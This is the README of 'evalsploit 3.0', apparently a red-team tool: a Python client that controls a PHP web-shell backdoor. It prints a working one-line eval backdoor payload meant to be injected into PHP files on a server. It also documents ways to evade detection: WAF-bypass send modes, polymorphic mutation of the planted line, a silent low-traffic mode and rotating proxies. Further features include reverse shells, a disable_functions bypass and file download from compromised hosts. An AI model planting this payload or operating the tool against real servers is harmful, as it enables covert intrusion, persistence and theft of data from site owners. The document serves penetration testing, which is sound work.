# evalsploit 3.0

**Eval-based PHP backdoor client** for red team and penetration testing. Works in restricted environments where `exec()` and shell are disabled: all file operations use only PHP built-ins (fopen, DirectoryIterator, copy, unlink, etc.).

- **One-line payload** - can be injected into any executed place in an infected PHP file or used as a standalone shell.
- **Session files** - save and load connections (URL + keys Z, V) for quick reconnect.
- **Mutation** - replace the backdoor line in the infected file with a new polymorphic payload and switch the client to new keys.
- **Silent mode** - on connect, do not request identification (pwd, ping); minimal traffic until first commands.
- **Proxies** - list of host:port, validation, one proxy per session (random or by index), switch without leaving the menu.
- **Plugins** - add custom commands without modifying core (see "Plugins" section).

**Documentation:** [Русский (main)](README_RU.md) | **English** | [中文](README_ZH.md)

P.S.
Yeah, now it works with PHP 8+ but at what cost ... [thanos_meme.png]

---

## Install

```bash
cd evalsploit
pip install -e .
# or
pip install -r requirements.txt
```

Data (sessions, settings, useragents) lives under `data/`. Copy `evalsploit-main/useragents` to `data/useragents` if needed.

---

## Run

```bash
python -m evalsploit
# or
evalsploit
```

At startup you can: enter a **session name** (from `data/sessions/`), enter a **new URL**, or leave empty to use the last connection from `data/settings.ini`.

---

## Payload

Use the payload as a single line in any executed PHP code, or as a standalone file:

```php
if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'],'',$_POST['Z'])));die();}
```

After changing the send mode or using custom param names, run **gen** to get the matching payload (and use the same Z, V in your session or settings).

---

## Send modes

| Mode      | Description |
|-----------|-------------|
| **bypass** | Payload in base64, split with separator; params Z and V. Bypasses some WAF/filters. |
| **classic** | Payload in base64 in param Z. |
| **simple**  | Raw PHP in param Z (no marker parsing; for debugging). |

On connect (unless **silent** is on), the client tries each mode and saves the working one. Set manually: `set send bypass|classic|simple`.

---

## Commands

Paths with spaces are supported: use the ` : ` separator for commands that take two paths (cp, ren/mv, upload with remote).

| Command   | Description |
|-----------|-------------|
| **ls**, **dir** | List directory (style: `set ls ls` or `set ls dir`) |
| **cd**, **pwd**, **home** | Change dir, print pwd, go to __DIR__ |
| **cat**   | Print file (style: `set cat bcat` / `set cat cat`) |
| **cp**    | Copy file: `cp <from> : <to>` (colon separator; both paths may contain spaces) |
| **rm**, **del** | Delete file: `rm <path>` or `del <path>` (confirmation if set confirm 1) |
| **ren**, **mv** | Rename/move: `ren <old> : <new>` |
| **download**, **get**, **dl** | Download from server: `download <remote_path>` or `download <remote_path> : <local_path>` (no second arg - to data/downloads; with ` : ` - to given file or directory; spaces OK in paths) |
| **upload**, **put**, **upl** | Upload: `upload <local_path>` or `upload <local_path> : <remote_path>` (colon for optional remote; both paths may contain spaces) |
| **mkdir**, **mkd**, **md** | Create directory |
| **create**, **mkf** | Create empty file |
| **touch**, **stat** | Touch timestamp / create empty; file/dir stat |
| **edit**  | Download -> edit locally -> upload |
| **run**   | Shell mode (exec/shell_exec/...) - type `exit` to quit |
| **exploit** | disable_functions bypass (e.g. 7.3–8.1) |
| **scan**  | Recursive scan, report in report/ |
| **reverse** | Reverse shell: `reverse <host>:<port>` |
| **set**   | Settings: `set <module> <value>` or `set <module> help` (incl. set proxy 0/1) |
| **proxy_switch** | Change current proxy: no args (new random), N (proxy #), random |
| **gen**, **generate** | Generate payload for current send mode and Z, V |
| **mutate** | Replace backdoor line on server with new polymorphic payload; update local Z, V |
| **sessions**, **saved** | List saved sessions |
| **save** \<name\> | Save current connection as session |
| **connect** \<name\> | Switch to saved session |
| **config** | Show current settings |
| **info**   | Server info (PHP, OS, etc.) |
| **ping**, **check** | Connectivity and latency check |
| **php**    | PHP console: enter code, send to server |
| **try**, **detect** | Check available run variants (e.g. `try run`) |
| **menu**   | Return to main startup menu (current session ends; confirmation prompted) |
| **help**, **exit** | Help; exit (confirmation prompted before quitting) |

---

## Session files

Stored in `data/sessions/` as \<name\>.ini:

```ini
[SESSION]
url = https://target.com/shell.php
Z = mg1qjg
V = 3I15EA
send_mode = bypass
silent = 0
```

URL and keys (Z, V) are required. **save \<name\>** creates a session; **connect \<name\>** loads it. **silent** is stored in the session file and applied when the session is loaded.

---

## Silent mode

With **set silent 1**, on connect the client skips:
- current directory request (pwd);
- backdoor reachability check (ping) and send-mode fallback.

Commands are sent as usual; you can get the current path with **pwd** or **cwd** (plugin). Useful to minimize traffic until you run commands. Stored globally and in the session file.

---

## Proxies

In the **startup menu**, option **5. Proxies** - submenu: load list from file (`data/proxies.txt` or custom path), validate each proxy (GET through proxy), list with OK status, enable/disable, choose mode - **random** (default; one random proxy per session) or by index. List is stored in `data/proxies.txt` (one line = `host:port`, blank lines and `#` lines ignored). Validated indices are kept in memory only until restart.

**After connect:** **set proxy 0** - disable, **set proxy 1** - enable. **set proxy show** - list validated proxies and choose by number. **set proxy switch** - pick another random proxy (excluding current). **set proxy switch N** - switch to proxy #N. **set proxy switch random** - random mode, next request uses a new random proxy. You can also use **proxy_switch** (alias). One chosen proxy is used until switched or disabled.

---

## Settings (set)

- **set run** - shell function for run (exec, shell_exec, system, passthru, popen, proc_open, expect_popen, pcntl_exec, do).
- **set ls** / **set cat** - list and read style (options from snippets.ini).
- **set send** - send mode: bypass, classic, simple.
- **set silent** - 0 or 1.
- **set reverse** - reverse shell type: ivan, monkey.
- **set confirm** - prompt for dangerous ops (rm, upl, edit): 0 or 1.
- **set rm**, **set del**, **set download**, **set upload**, **set rename**, **set stat**, **set touch**, **set create**, **set mkdir**, **set cp** - snippet choice per command (keys from snippets.ini). Aliases (dl, get, upl, put, mkf, mkd, md, ren, mv) are accepted.

---

## Plugins

Plugins add new commands without changing evalsploit core.

### How it works

On startup, evalsploit loads all `*.py` files from `evalsploit/plugins/` (files starting with `_` are skipped). Each plugin must register a command with the `@register` decorator and implement a class inheriting `Module` with `run(ctx, args)`.

- **ctx** (SessionContext): `ctx.send(php)` to send PHP to the server, `ctx.config`, `ctx.pwd`, `ctx.resolve_path(path)`, `ctx.file_exists(path)`, `ctx.url`, `ctx.uagent`, etc.
- **args** - string: everything the user typed after the command name (parse arguments in the plugin).

Optionally pass **description** and **usage** to `@register`; they appear in **help**.

### Minimal plugin example

Create `evalsploit/plugins/mycmd.py`:

```python
from evalsploit.modules.registry import register
from evalsploit.modules.base import Module

@register("mycmd", description="Short description", usage="mycmd [path]")
class MyCmdModule(Module):
    def run(self, ctx, args):
        path = ctx.resolve_path(args.strip()) if args.strip() else ctx.pwd
        php = "echo getcwd();"
        print(ctx.send(php).strip())
        return None
```

On next run, **mycmd** will appear in the command list and in **help**.

### Guidelines

- One file per command (command name is set in `@register`).
- Imports: `register` from `evalsploit.modules.registry`, `Module` from `evalsploit.modules.base`. Use `php_quote()` from `evalsploit.modules.base` when embedding paths in PHP strings.
- Handle exceptions and print user-facing messages; avoid uncaught crashes.
- For dangerous operations use `confirm_dangerous(ctx, action, detail)` from `evalsploit.modules.base`.

See [evalsploit/plugins/README.md](evalsploit/plugins/README.md) and examples `example_echo.py`, `example_cwd.py` for more.

---

## Snippets

File commands (ls, cat, rm, dl, upload, touch, stat, etc.) use PHP snippets from `evalsploit/modules/snippets/`. Index in `snippets.ini`. Choose variant with **set** \<command\> \<key\>. Keys from settings.ini are validated on load; invalid ones are reset with a stderr warning.

---

## Mutation

**mutate** generates a new polymorphic backdoor (new Z, V), sends PHP that reads the current script, finds the line with the current trigger (`isset($_POST['Z'])`), replaces it with the new backdoor, and writes the file. The client updates its Z and V. Other backdoor copies (other URLs) keep using old keys until you update or mutate them.

---

## Architecture

- **config** - global settings, session load/save, snippet key validation.
- **context** - URL, pwd, user-agent, `send(php)`, path helpers (`resolve_path`, `file_exists`).
- **transport** - payload encoding (bypass/classic/simple), POST, response parsing by marker (output before marker ignored).
- **payloads** - one-liner, polymorphic backdoor, mutation PHP.
- **modules** - each command is a registered module; file ops use snippets from `evalsploit/modules/snippets/`.

Adding a core module: implement `run(ctx, args)`, use `@register("cmdname")`, add a snippet in `snippets/` if needed. Use `php_quote(value)` when substituting paths into snippets.

---

## Changelog (vs earlier evalsploit)

### Added / improved

- **menu** - Return to main startup menu from the session loop; confirmation prompt so the current session is explicitly ended. **exit** now also asks for confirmation before quitting the process.
- **Command names and aliases** - More intuitive primary names with backward‑compatible aliases:
  - **mkdir** (aliases: mkd, md) - create directory  
  - **create** (alias: mkf) - create empty file  
  - **download** (aliases: get, dl) - download from server; optional `download <remote> : <local>` to save to a given file or directory (without second arg - to data/downloads).  
  - **upload** (aliases: put, upl) - upload; optional remote path via ` : ` separator  
  - **ren** (alias: mv) - rename/move  
  - **gen** (alias: generate), **try** (alias: detect), **rm** (alias: del)
- **Paths with spaces** - Commands that take two paths use the ` : ` separator (cp, ren/mv, upload). Single‑path commands (download, get, dl, rm, cat, cd, etc.) accept the full line as one path, so spaces are supported. **upload** was changed to use ` : ` for the optional remote path so both local and remote paths can contain spaces.
- **Help (usage)** - HELP_TEXTS and in‑app help now show correct usage: e.g. `cp <from> : <to>`, `download <remote_path>`, `upload <local_path> [ : <remote_path>]`.
- **set** - Accepts all new names and aliases for snippet selection (mkdir, create, download, upload, del, ren, mv, etc.).

### Breaking / behavioral changes

- **upload** - Two paths must be separated by ` : `. The old form `upload <local> <remote>` (two space‑separated words) is no longer supported; use `upload <local> : <remote>` so paths with spaces work.
- **exit** - Requires confirmation (y/yes) before exiting the program; EOF (e.g. Ctrl+Z/D) still exits without prompt.

---

## Comparison with alternatives

### Weevely

Weevely uses its own payload format and protocol (referrer/cookie, encryption). evalsploit uses a single simple eval one-liner, minimal server footprint, configurable keys (Z, V) and send modes (bypass/classic/simple), in-place mutation (replace one line), and file operations via PHP built-ins only (no exec/shell). Plugins in Python add commands without rebuilding.

### PhpSploit

PhpSploit is a full C2 framework with header-based tunneling and many plugins. evalsploit focuses on simplicity: one eval one-liner, POST params (Z, V), response marker for predictable debugging. Sessions as plain .ini (url, Z, V, send_mode, silent). Silent mode minimizes connect-time traffic. Snippet keys validated on load. Plugins in one folder extend functionality without touching core.

### Advantages of evalsploit

- Minimal payload - one eval line, easy to inject.
- No exec/shell - PHP built-ins only (fits disable_functions).
- Flexible keys and send modes, in-place mutation.
- Sessions and silent mode for fast reconnect and low profile.
- Plugins - new commands via a single .py in plugins/.
- Simple architecture - easy to debug and extend.

---

## License / use

For authorized security testing and research only.
